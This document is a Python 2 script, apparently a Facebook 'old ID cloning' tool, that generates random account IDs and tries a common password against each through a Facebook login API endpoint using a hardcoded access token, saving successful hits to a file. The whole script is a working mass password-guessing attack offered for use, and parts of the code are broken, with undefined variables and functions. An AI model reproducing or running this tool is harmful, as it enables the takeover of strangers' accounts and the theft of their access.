#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(90000):

    nmbr = random.randint(111111111,999999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
                 ____        ____        ______      ______    __    __ 
 /\  _`\     /\  _`\     /\__  _\    /\__  _\  /\ \  /\ \
 \ \,\L\_\   \ \ \L\ \   \/_/\ \/    \/_/\ \/  \ `\`\\/'/
  \/_\__ \    \ \ ,  /      \ \ \       \ \ \   `\ `\ /' 
    /\ \L\ \   \ \ \\ \      \_\ \__     \ \ \    `\ \ \ 
    \ `\____\   \ \_\ \_\    /\_____\     \ \_\     \ \_\
     \/_____/    \/_/\/ /    \/_____/      \/_/      \/_/
                                                         
                                                         



______________________________________________________

 [*] DEVELOPER :ðŸ”¥ SRITY ISLAMðŸ”¥
 [*] FACEBOOK  : Srity Islam
 [*] GITHIB    : SRITY
 [*] VERSION   : 1.00(Lite)
_____________________________________________________
"""

####Logo####

logo1 = """
     ____        ____        ______      ______    __    __ 
 /\  _`\     /\  _`\     /\__  _\    /\__  _\  /\ \  /\ \
 \ \,\L\_\   \ \ \L\ \   \/_/\ \/    \/_/\ \/  \ `\`\\/'/
  \/_\__ \    \ \ ,  /      \ \ \       \ \ \   `\ `\ /' 
    /\ \L\ \   \ \ \\ \      \_\ \__     \ \ \    `\ \ \ 
    \ `\____\   \ \_\ \_\    /\_____\     \ \_\     \ \_\
     \/_____/    \/_/\/ /    \/_____/      \/_/      \/_/
                                                         
                                                         



______________________________________________________

 [*] DEVELOPER : SRITY
 [*] FACEBOOK  : Srity Islam
 [*] GITHIB    : SRITY
 [*] TOOLS     : OLD ID CLON 2009
 [*] VERSION   : 1.00(Lite)
_____________________________________________________

\033[32mSHA4T0
"""
logo2 = """
                 _______  _______ __________________         
 (  ____ \(  ____ )\__   __/\__   __/|\     /|
 | (    \/| (    )|   ) (      ) (   ( \   / )
 | (_____ | (____)|   | |      | |    \ (_) / 
 (_____  )|     __)   | |      | |     \   /  
       ) || (\ (      | |      | |      ) (   
 /\____) || ) \ \_____) (___   | |      | |   
 \_______)|/   \__/\_______/   )_(      \_/   
                                              



______________________________________________________

 [*] DEVELOPER : SRITY
 [*] FACEBOOK  : Srity Islam
 [*] GITHIB    : SRITY
 [*] TOOLS     : OLD ID CLON 2009
 [*] VERSION   : 1.00(Lite)
_____________________________________________________

\033[32mSRITY
"""



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m[1]\x1b[1;91mSTART ( \033[1;92mCloning)"
    time.sleep(0.05)
    print "\033[1;95m[2]\x1b[1;94mUPDATE (1.0)"
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m Exit ( Back)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  START CLONING'
    time.sleep(0.10)
    print '\x1b[1;93m[0] back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "(1) 2009-10 [Enter - 00]"+'\n'
        print '\x1b[1;91mEnter only 00 TO CLONE 2004-2009 ACCOUNT'
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            k="1000"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;93mWait A While \x1b[1;94mStart Cracking...")
    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 =  "123456"
            pass2 = "12345678"
            pass3 = "abc123"
            pass4 = "@12345"
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;95m(7 DAY CP🤦‍♂️)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
           
                    


        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 4 days")
    print ''
    print """
    ███
──────────███║SHA4T0║\033[1;95mFb\033[1;97m 
\033[1;95m033[1;97m"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()
